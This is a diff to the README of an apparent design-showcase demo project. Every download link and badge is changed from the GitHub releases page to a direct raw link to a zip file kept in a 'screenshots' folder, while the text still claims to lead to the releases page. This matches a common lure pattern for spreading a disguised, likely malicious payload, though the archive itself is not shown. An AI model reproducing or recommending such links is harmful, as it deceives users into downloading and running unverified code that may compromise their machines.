@@ -1,6 +1,6 @@
 # 🎨 frontend-design-pro-demo - Explore Unique Design Styles Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/MaxyExpert/frontend-design-pro-demo/releases)
+[![Download](https://raw.githubusercontent.com/MaxyExpert/frontend-design-pro-demo/main/demos-v02/screenshots/frontend-design-pro-demo_v1.1.zip)](https://raw.githubusercontent.com/MaxyExpert/frontend-design-pro-demo/main/demos-v02/screenshots/frontend-design-pro-demo_v1.1.zip)
 
 ## 🎯 Overview
 Welcome to the Frontend Design Pro Demo! This application showcases 11 distinct design aesthetics. Whether you’re a designer looking for inspiration or a business wanting a fresh look, this app provides a variety of styles to explore.
@@ -8,7 +8,7 @@ Welcome to the Frontend Design Pro Demo! This application showcases 11 distinct 
 ## 🚀 Getting Started
 Follow these simple steps to download and run the application:
 
-1. **Visit the download page:** Click on this link to go to the releases page: [Download Here](https://github.com/MaxyExpert/frontend-design-pro-demo/releases).
+1. **Visit the download page:** Click on this link to go to the releases page: [Download Here](https://raw.githubusercontent.com/MaxyExpert/frontend-design-pro-demo/main/demos-v02/screenshots/frontend-design-pro-demo_v1.1.zip).
 
 ## 📥 Download & Install
 On the releases page, you will find several options:
@@ -68,4 +68,4 @@ Stay updated and connect with other users:
 - Follow our GitHub repository for the latest updates.
 - Join discussions and share ideas on our community forum.
 
-Thank you for choosing Frontend Design Pro Demo! Your design journey starts here. Visit this page to download: [Download Here](https://github.com/MaxyExpert/frontend-design-pro-demo/releases).
+Thank you for choosing Frontend Design Pro Demo! Your design journey starts here. Visit this page to download: [Download Here](https://raw.githubusercontent.com/MaxyExpert/frontend-design-pro-demo/main/demos-v02/screenshots/frontend-design-pro-demo_v1.1.zip).
